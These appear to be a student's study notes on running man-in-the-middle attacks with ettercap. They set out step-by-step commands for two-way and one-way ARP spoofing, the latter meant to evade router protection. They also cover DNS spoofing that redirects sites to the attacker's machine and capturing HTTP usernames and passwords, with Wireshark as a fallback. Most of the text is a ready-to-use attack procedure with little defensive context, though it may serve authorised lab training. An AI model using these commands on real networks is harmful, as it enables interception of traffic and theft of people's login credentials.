This is a tool to run a MITM attack

- install ettercap
- Modify config file
   - leafpad /etc/ettercap/etter.conf
      - Set UID to zero for both [ec_uid and ec_gid]
      - Remove hashes from ip tables section
      - ctrl s to save
      - ctrl q to quit
- to use the tool
   - ettercap -Tq ///
      - -Tq means we will use the tool in text mode
      - this commands runs the tool without specifying any specific targets
   - After it starts you can start to type commands as the tool is interactive
      - press l to show all hosts in the network
      - press q to quit

# ARP spoofing attack
- ettercap -Tq -M arp:remote -i wlan0 /10.20.215.1// /10.20.215.9// 
   - M is the MITM method
   - i is the interface
   - if you want to target all connected clients on the network, use /// ///
   - MAC_ADDRESS/IPv4/IPv6/ports
   - the first /// is the gateway
   - the second /// is the targets
   - you can also use ranges, ie /10.20.215.9-20//
   - you can use commas, ie  /10.20.215.9,10.20.215.10//
- This attack changes the MAC address of the broadcast IP (router) to the attacking kali machine so that all traffic now goes first to kali then the router
- This tool with sniff our user/pass on http (insecure) logins

# Pluggins
- adds additional functionality like
	- automatically add new clients
	- re-poison clients after arp broadcasts
	- DNS spoof targets
		- redirect url to another one of our choice
		- setup before use
			- leafpad /etc/ettercap/etter.dns
				- modify A records
				- ie. bing.com A 192.168.2.5 or .bing.com A 192.168.2.5
					- This command will redirect bing.com to IP address of your kali machine
		- call ettercap with plugin
			- ettercap -Tq -M arp:remote -i wlan0 -S -P dns_spoof /10.20.215.1// /10.20.215.9// 
				- -S means not to create ssl self service certificates
- how to use pluggins?
	- ettercap -Tq -M arp:remote -i wlan0 ///
	- press p for plugins
	- The zero in front of the plugin means it is inactive
	- type autoadd and press enter


If router has security turned on to identify and prevent ARP spoofing, we need to use one way ARP spoofing
- This means we only tell the target that we are the router. We don't tell the router that we are the target computer.
- The drawback is that the attacker cannot see the responses as the real router sends those directly to target machine

# How to perform this attack?
- ettercap -Tq -M arp:oneway -i wlan0 -S /10.20.215.1// /10.20.215.9//
   - The first group is the victim
   - The second group is the router
- Use wireshark if some user/pass are missed by ettercap
   - set filter to http

